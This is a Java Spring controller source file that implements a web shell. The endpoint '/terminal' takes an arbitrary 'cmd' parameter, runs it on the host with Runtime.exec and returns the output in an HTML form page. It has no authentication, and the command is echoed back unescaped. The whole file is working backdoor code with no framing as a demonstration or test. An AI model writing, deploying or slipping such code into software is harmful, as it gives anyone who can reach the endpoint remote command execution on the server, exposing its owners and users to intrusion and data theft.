package com.facebook.springcommunity.javashell;

import java.io.DataInputStream;
import java.io.IOException;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class ShellController {
	
	@RequestMapping(value = "/terminal", method = RequestMethod.GET)
	@ResponseBody
    public String index(@ModelAttribute("cmd") String cmd) {
		StringBuilder htmlBuilder = new StringBuilder();
		htmlBuilder.append("<html><body>");
		htmlBuilder.append("<hr><p><form method=\"GET\" name=\"myform\" action=\"\">");
		htmlBuilder.append("<input type=\"text\" name=\"cmd\">");
		htmlBuilder.append("<input type=\"submit\" value=\"Send\">");
		htmlBuilder.append("</form>");
		if(cmd != null) {
			htmlBuilder.append("\n<hr><p><b>Command: " + cmd + "\n</b><br><br><hr><pre>\n");
	        Process p;
			try {
				p = Runtime.getRuntime().exec(cmd);
		        DataInputStream procIn = new DataInputStream(p.getInputStream());
				int c='\0';
	        	while ((c=procIn.read()) != -1) {
	        		htmlBuilder.append((char)c);
					}
			} catch (IOException e) {
				e.printStackTrace();
			}

	    }
		htmlBuilder.append("\n<hr></pre>");
		htmlBuilder.append("</body></html>");
    	return htmlBuilder.toString();
    }
}
